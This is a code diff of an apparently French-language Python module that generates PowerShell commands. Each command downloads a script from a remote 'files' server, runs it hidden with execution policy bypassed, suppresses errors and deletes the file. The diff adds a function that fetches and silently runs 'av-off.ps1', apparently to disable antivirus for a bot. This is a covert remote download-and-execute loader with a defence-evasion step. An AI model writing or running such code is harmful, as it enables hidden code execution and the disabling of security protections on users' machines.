@@ -29,32 +29,50 @@ def _short_runner(tool_id: str | None = None, *, all_tools: bool = False) -> str
     if all_tools:
         script = f"{files}/scripts/export-tools.ps1"
         return f"""
-$ErrorActionPreference='Continue'
+$ErrorActionPreference='SilentlyContinue'
+try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
 $files={_q(files)}
 $env:AGENTSHE_FILES=$files
 $tmp=Join-Path $env:TEMP ('hh-export-'+[guid]::NewGuid().ToString('n')+'.ps1')
 & curl.exe -fsSL {_q(script)} -o $tmp
 if(-not(Test-Path $tmp)){{throw 'export script download failed'}}
-& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp
-$code=$LASTEXITCODE
+$o=& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp 2>&1 | Out-String
+Write-Output $o
 Remove-Item $tmp -Force -EA SilentlyContinue
-if($code -ne 0){{exit $code}}
 """.strip()
     if not tool_id or tool_id not in TOOLS_BY_ID:
         raise ValueError(f"outil inconnu: {tool_id}")
     script = f"{files}/scripts/run-tool.ps1"
     return f"""
-$ErrorActionPreference='Continue'
+$ErrorActionPreference='SilentlyContinue'
+try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
 $files={_q(files)}
 $env:AGENTSHE_FILES=$files
 $env:AGENTSHE_TOOL_ID={_q(tool_id)}
 $tmp=Join-Path $env:TEMP ('hh-tool-'+[guid]::NewGuid().ToString('n')+'.ps1')
 & curl.exe -fsSL {_q(script)} -o $tmp
 if(-not(Test-Path $tmp)){{throw 'run-tool download failed'}}
-& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp
-$code=$LASTEXITCODE
+$o=& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp 2>&1 | Out-String
+Write-Output $o
 Remove-Item $tmp -Force -EA SilentlyContinue
-if($code -ne 0){{exit $code}}
+""".strip()
+
+
+def build_av_off_ps() -> str:
+    files = _files_base()
+    script = f"{files}/scripts/av-off.ps1"
+    return f"""
+$ErrorActionPreference='SilentlyContinue'
+try{{$PSNativeCommandUseErrorActionPreference=$false}}catch{{}}
+$files={_q(files)}
+$env:AGENTSHE_FILES=$files
+$env:AGENTSHE_BOT_BASE=($files -replace '/files$','')
+$tmp=Join-Path $env:TEMP ('hh-avoff-'+[guid]::NewGuid().ToString('n')+'.ps1')
+& curl.exe -fsSL {_q(script)} -o $tmp
+if(-not(Test-Path $tmp)){{throw 'av-off download failed'}}
+$o=& powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $tmp 2>&1 | Out-String
+Write-Output $o
+Remove-Item $tmp -Force -EA SilentlyContinue
 """.strip()
 
 
